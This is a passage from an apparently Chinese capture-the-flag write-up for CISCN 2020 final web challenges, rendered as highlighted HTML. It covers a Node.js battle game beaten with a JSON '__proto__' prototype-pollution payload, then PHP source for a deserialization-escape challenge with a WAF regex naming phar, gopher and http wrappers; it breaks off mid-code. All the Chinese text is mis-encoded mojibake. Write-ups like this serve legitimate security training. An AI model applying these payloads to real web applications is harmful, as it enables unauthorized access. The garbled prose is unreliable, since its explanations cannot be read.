string">&lt;/B&gt;æ”»å‡»åŠ›ä¸º&lt;B&gt;</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span><span class="token function">getPlayerDamageValue</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">&lt;/B&gt;!</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span>        <span class="token keyword">switch</span> <span class="token punctuation">(</span><span class="token function">playerUseItem</span><span class="token punctuation">(</span>round<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">case</span> <span class="token number">0</span><span class="token operator">:</span>                <span class="token keyword">break</span>            <span class="token keyword">case</span> <span class="token number">1</span><span class="token operator">:</span>                battleLog<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">ç©å®¶&lt;B&gt;</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>player<span class="token punctuation">.</span>name<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">&lt;/B&gt;ä½¿ç”¨äº†ç‰©å“&lt;B&gt;æ²»ç–—è¯è†&lt;/B&gt;! ç©å®¶ç”Ÿå‘½å€¼+10ï¼</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span>                <span class="token keyword">break</span>            <span class="token keyword">case</span> <span class="token number">2</span><span class="token operator">:</span>                battleLog<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">ç©å®¶&lt;B&gt;</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>player<span class="token punctuation">.</span>name<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">&lt;/B&gt;ä½¿ç”¨äº†ç‰©å“&lt;B&gt;ç™½é“¶ä¹‹é”‹&lt;/B&gt;! å³å°†é€ æˆ130%æš´å‡»ï¼</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span>                <span class="token keyword">break</span>            <span class="token keyword">case</span> <span class="token number">3</span><span class="token operator">:</span>                battleLog<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">ç©å®¶&lt;B&gt;</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>player<span class="token punctuation">.</span>name<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">&lt;/B&gt;ä½¿ç”¨äº†ç‰©å“&lt;B&gt;é‚ªæ¶é•°åˆ€&lt;/B&gt;! &lt;B&gt;åœ°ç©´é¢†ä¸»&lt;/B&gt;çš„æ”»å‡»åŠ›å˜ä¸ºäº†80%ï¼</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span>                <span class="token keyword">break</span>        <span class="token punctuation">}</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>round <span class="token operator">===</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">switch</span> <span class="token punctuation">(</span><span class="token function">triggerPassiveSkill</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">case</span> <span class="token number">1</span><span class="token operator">:</span>                    battleLog<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">ç©å®¶&lt;B&gt;</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>player<span class="token punctuation">.</span>name<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">&lt;/B&gt;è§¦å‘äº†&lt;B&gt;æˆ˜ç¥é¢†ä¸»&lt;/B&gt;çš„è¢«åŠ¨æŠ€èƒ½&lt;B&gt;æ—‹é£é£æ–§&lt;/B&gt;! ä¸‹æ¬¡æ”»å‡»çš„æ”»å‡»åŠ›+5ï¼</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span>                    <span class="token keyword">break</span>                <span class="token keyword">case</span> <span class="token number">2</span><span class="token operator">:</span>                    battleLog<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">ç©å®¶&lt;B&gt;</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>player<span class="token punctuation">.</span>name<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">&lt;/B&gt;è§¦å‘äº†&lt;B&gt;å¥¥æœ¯ç¥­å¸&lt;/B&gt;çš„è¢«åŠ¨æŠ€èƒ½&lt;B&gt;å·«æ¯’æ¢å¤&lt;/B&gt;! ç©å®¶&lt;B&gt;</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>player<span class="token punctuation">.</span>name<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">&lt;/B&gt;çš„ç”Ÿå‘½å€¼+10ï¼</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span>                    <span class="token keyword">break</span>                <span class="token keyword">case</span> <span class="token number">3</span><span class="token operator">:</span>                    battleLog<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">ç©å®¶&lt;B&gt;</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>player<span class="token punctuation">.</span>name<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">&lt;/B&gt;è§¦å‘äº†&lt;B&gt;æš—å¤œæ¸¸ä¾ &lt;/B&gt;çš„è¢«åŠ¨æŠ€èƒ½&lt;B&gt;ç™¾æ­¥ç©¿æ¨&lt;/B&gt;! ä¸‹æ¬¡æ”»å‡»çš„æ”»å‡»åŠ›+7ï¼</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token function">playerAttackMonster</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        battleLog<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">ç©å®¶&lt;B&gt;</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>player<span class="token punctuation">.</span>name<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">&lt;/B&gt;æ”»å‡»äº†&lt;B&gt;åœ°ç©´é¢†ä¸»&lt;/B&gt;å¹¶é€ æˆ&lt;B&gt;</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span><span class="token function">getPlayerDamageValue</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">&lt;/B&gt;ç‚¹ä¼¤å®³! &lt;B&gt;åœ°ç©´é¢†ä¸»&lt;/B&gt;å‰©ä½™è¡€é‡ä¸º&lt;B&gt;</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>monster<span class="token punctuation">.</span><span class="token constant">HP</span><span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">&lt;/B&gt;</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>monster<span class="token punctuation">.</span><span class="token constant">HP</span> <span class="token operator">&lt;=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            battleLog<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token string">' '</span><span class="token punctuation">)</span>            <span class="token keyword">break</span>        <span class="token punctuation">}</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">monsterPassiveSkill</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            battleLog<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">&lt;B&gt;åœ°ç©´é¢†ä¸»&lt;/B&gt;è§¦å‘äº†è¢«åŠ¨æŠ€èƒ½&lt;B&gt;ç¼©åœ°&lt;/B&gt;ï¼ç”Ÿå‘½å€¼å›å¤20ç‚¹ï¼å›å¤åç”Ÿå‘½å€¼ä¸º&lt;B&gt;</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>monster<span class="token punctuation">.</span><span class="token constant">HP</span><span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">&lt;/B&gt;</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span>        <span class="token punctuation">}</span>        battleLog<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">&lt;B&gt;åœ°ç©´é¢†ä¸»&lt;/B&gt;æ”»å‡»äº†ç©å®¶&lt;B&gt;</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>player<span class="token punctuation">.</span>name<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">&lt;/B&gt;å¹¶é€ æˆ&lt;B&gt;</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span><span class="token function">monsterAttackPlayer</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">&lt;/B&gt;ç‚¹ä¼¤å®³! ç©å®¶&lt;B&gt;</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>player<span class="token punctuation">.</span>name<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">&lt;/B&gt;å‰©ä½™è¡€é‡ä¸º&lt;B&gt;</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>player<span class="token punctuation">.</span><span class="token constant">HP</span><span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">&lt;/B&gt;</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span>        monster<span class="token punctuation">.</span>aggressivity <span class="token operator">=</span> <span class="token number">40</span><span class="token punctuation">;</span>        monster<span class="token punctuation">.</span>buff <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        player<span class="token punctuation">.</span>buff <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        round<span class="token operator">++</span>        battleLog<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token string">' '</span><span class="token punctuation">)</span>    <span class="token punctuation">}</span> <span class="token keyword">while</span> <span class="token punctuation">(</span>player<span class="token punctuation">.</span><span class="token constant">HP</span> <span class="token operator">&gt;</span> <span class="token number">0</span> <span class="token operator">&amp;&amp;</span> monster<span class="token punctuation">.</span><span class="token constant">HP</span> <span class="token operator">&gt;</span> <span class="token number">0</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>player<span class="token punctuation">.</span><span class="token constant">HP</span> <span class="token operator">&gt;</span> monster<span class="token punctuation">.</span><span class="token constant">HP</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        battleLog<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token string">"æ­å–œä½ èƒœåˆ©äº†ï¼è¿™æ˜¯ç»™ä½ çš„å¥–åŠ±ï¼š"</span> <span class="token operator">+</span> flag<span class="token punctuation">)</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>        battleLog<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token string">"å¾ˆé—æ†¾ï¼Œä½ è¢«æ‰“è´¥äº†ï¼Œä½†æ˜¯ä¸è¦ç°å¿ƒï¼Œå†æ¥å†å‰"</span><span class="token punctuation">)</span>    <span class="token punctuation">}</span>    player <span class="token operator">=</span> monster <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>    res<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">"result"</span><span class="token punctuation">,</span> <span class="token punctuation">{</span><span class="token string">"result_5be4038eaf61b1b7abad92cfece05cd7"</span> <span class="token operator">:</span> battleLog<span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span><span class="token string">"&lt;br /&gt;\n"</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">)</span></code></pre><p>å‡º flag éœ€è¦ <strong>player.HP &gt; monster.HP</strong>ï¼Œä½†ä¸èƒ½ç›´æ¥æ”¹ player.HPã€‚</p><p>ä¸è¿‡å¯ä»¥<strong>åŠ å¤§ buff</strong>ï¼Œå†çœ‹æºç ä¸­è¿™ä¸€éƒ¨åˆ†ã€‚</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">for</span> <span class="token punctuation">(</span> <span class="token keyword">let</span> i <span class="token keyword">in</span> tempPlayer <span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>player<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span>i <span class="token operator">==</span> <span class="token string">'career'</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span>careers<span class="token punctuation">.</span><span class="token function">includes</span><span class="token punctuation">(</span>tempPlayer<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token punctuation">(</span>i <span class="token operator">==</span> <span class="token string">'item'</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span>items<span class="token punctuation">.</span><span class="token function">includes</span><span class="token punctuation">(</span>tempPlayer<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token punctuation">(</span>i <span class="token operator">==</span> <span class="token string">'round_to_use'</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token function">checkRound</span><span class="token punctuation">(</span>tempPlayer<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">||</span> tempPlayer<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token string">''</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">continue</span>        <span class="token punctuation">}</span>        player<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> tempPlayer<span class="token punctuation">[</span>i<span class="token punctuation">]</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>è¿™é‡ŒæŠŠæ¥æ”¶åˆ°çš„ tempPlayer è¿™ä¸ª object ä¸­çš„ value ä¸ä¸ºç©ºå†…å®¹éƒ½èµ‹ç»™ player äº†ã€‚</p><p>äºæ˜¯æˆ‘ä»¬å¯ä»¥é€šè¿‡æ±¡æŸ“åŸå‹é“¾ï¼ŒæŠŠ buff æ”¹å¤§ã€‚</p><blockquote><p>å¤§å¸ˆå‚…æœ‰è¨€ï¼š</p><p>åŸå‹æ±¡æŸ“ï¼Œè™½ç„¶ä¸èƒ½æ±¡æŸ“åˆ°çœŸæ­£çš„åŸå‹ï¼Œä½†æ˜¯å¯ä»¥æ›¿æ¢ player å¯¹è±¡çš„åŸå‹åˆ°æˆ‘ä»¬çš„æ¶æ„å¯¹è±¡ï¼Œå°† buff ææˆä¸€ä¸ªç‰¹åˆ«å¤§çš„å€¼å°±èƒ½ç§’æ€ bossã€‚</p></blockquote><p><strong>Payload:</strong></p><pre class="language-json" data-language="json"><code class="language-json"><span class="token punctuation">{</span>    <span class="token property">"name"</span><span class="token operator">:</span> <span class="token string">"asdasd"</span><span class="token punctuation">,</span>    <span class="token property">"round_to_use"</span><span class="token operator">:</span> <span class="token number">1</span><span class="token punctuation">,</span>    <span class="token property">"career"</span><span class="token operator">:</span> <span class="token string">"high_priest"</span><span class="token punctuation">,</span>    <span class="token property">"item"</span><span class="token operator">:</span> <span class="token string">"ZLYG"</span><span class="token punctuation">,</span>    <span class="token property">"__proto__"</span><span class="token operator">:</span> <span class="token punctuation">{</span>    <span class="token property">"buff"</span><span class="token operator">:</span> <span class="token number">1000</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p><img src="/2020/10/06/CTF_2020CISCN_final/image-20201006153154041.png" alt="battle"></p><h3 id="Web3"><a href="#Web3" class="headerlink" title="Web3"></a>Web3</h3><p><strong>ååºåˆ—åŒ–é€ƒé€¸</strong></p><p>lib.php éƒ¨åˆ†æºç  User ç±»</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">private</span> <span class="token keyword">function</span> <span class="token function">waf</span><span class="token punctuation">(</span><span class="token variable">$string</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$waf</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'/phar|file|gopher|http|sftp|flag/i'</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token variable">$waf</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'index'</span><span class="token punctuation">,</span> <span class="token variable">$string</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">private</span> <span class="token keyword">function</span> <span class="token function">check_data</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">foreach</span><span class="token punctuation">(</span> <span class="token variable">$data</span> <span class="token keyword">as</span> <span class="token variable">$key</span> <span class="token operator">=&gt;</span> <span class="token variable">$value</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">is_array</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>            <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token function">check_data</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">is_object</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$value</span> <span class="token keyword">instanceof</span> <span class="token class-name">User</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token variable">$data_avatar</span> <span class="token operator">=</span> <span class="token variable">$value</span><span class="token operator">-&gt;</span><span class="token function">get_avatar</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">is_string</span><span class="token punctuation">(</span><span class="token variable">$data_avatar</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$data_avatar</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token variable">$content</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token constant">__DIR__</span> <span class="token operator">.</span> <span class="token string double-quoted-string">"/"</span> <span class="token operator">.</span> <span class="token variable">$data_avatar</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token variable">$png_header</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"\x89\x50\x4E\x47\x0D\x0A\x1A\x0A\x00\x00\x00\x0D\x49\x48\x44\x52"</span><span class="token punctuation">;</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strpos</span><span class="token punctuation">(</span><span class="token variable">$content</span><span class="token punctuation">,</span> <span class="token variable">$png_header</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token constant boolean">false</span> <span class="token punctuation">)</span>                <span class="token punctuation">{</span>                    <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">Exception</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"png content got an unexpected Exception"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">update</span><span class="token punctuation">(</span><span class="token variable">$profile</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token function">waf</span><span class="token punctuation">(</span><span class="token variable">$profile</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"old_password"</span><span class="token punctuation">]</span> <span class="token operator">!==</span> <span class="token variable">$data</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"old_real_password"</span><span class="token punctuation">]</span> <span class="token punctuation">)</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token function">check_data</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">password</span> <span class="token operator">=</span> <span class="token variable">$data</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"password"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">age</span> <span class="token operator">=</span> <span class="token variable">$data</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"age"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">email</span> <span class="token operator">=</span> <span class="token variable">$data</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"email"</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment">//......</span><span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">username</span><span class="token punctuation">)</span>        <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">password</span><span class="token punctuation">)</span>        <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">age</span><span class="token punctuation">)</span>        <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">email</span><span class="token punctuation">)</span>        <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">avatar</span><span class="token punctuation">)</span>        <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">content</span><span class="token punctuation">)</span>        <span class="token operator">&amp;&amp;</span> <span class="token function">is_string</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">avatar</span><span class="token punctuation">)</span>        <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">avatar</span><span class="token punctuation">)</span>        <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/\:\/\//'</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">avatar</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">content</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token constant">__DIR__</span> <span class="token operator">.</span> <span class="token string double-quoted-string">"/"</span> <span class="token operator">.</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">avatar</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$res</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"&lt;script&gt;\nvar img = document.createElement(\"img\");\nimg.src= \"data:image/png;base64,content\";\nimg.alt = \"user\";\ndocument.getElementById(\"pro-avatar\").append(img);\n&lt;/script&gt;"</span><span class="token punctuation">;</span>        <span class="token variable">$res</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"content"</span><span class="token punctuation">,</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">content</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token variable">$res</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token variable">$res</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>dashboard.php éƒ¨åˆ†æºç </p><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"old_password"</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"update_password"</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"update_age"</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"update_email"</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token operator">&amp;&amp;</span> <span class="token function">is_string</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"old_password"</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token operator">&amp;&amp;</span> <span class="token function">is_string</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"update_password"</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token operator">&amp;&amp;</span> <span class="token function">is_string</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"update_age"</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token operator">&amp;&amp;</span> <span class="token function">is_string</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"update_email"</span><span class="token punctuation">]</span><span class="token punctuation">)</span>   <span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/[^\d]/'</span><span class="token punctuation">,</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"update_age"</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token operator">!</span><span class="token function">filter_var</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"update_email"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token constant">FILTER_VALIDATE_EMAIL</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token class-name">strlen</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"update_password"</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token number">16</span> <span class="token operator">||</span> <span class="token class-name">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/\W/'</span><span class="token punctuation">,</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"update_password"</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>        <span class="token variable">$user</span><span class="token operator">-&gt;</span><span class="token function">alertMes</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"invalid information"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"./dashboard.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$update_profile</span> <span class="token operator">=</span> <span class="token keyword">array</span> <span class="token punctuation">(</span>        <span class="token string double-quoted-string">"old_password"</span> <span class="token operator">=&gt;</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"old_password"</span><span class="token punctuation">]</span><span class="token punctuation">,</span>        <span class="token string double-quoted-string">"old_real_password"</span> <span class="token operator">=&gt;</span> <span class="token variable">$user</span><span class="token operator">-&gt;</span><span class="token property">password</span><span class="token punctuation">,</span>        <span class="token string double-quoted-string">"password"</span> <span class="token operator">=&gt;</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string 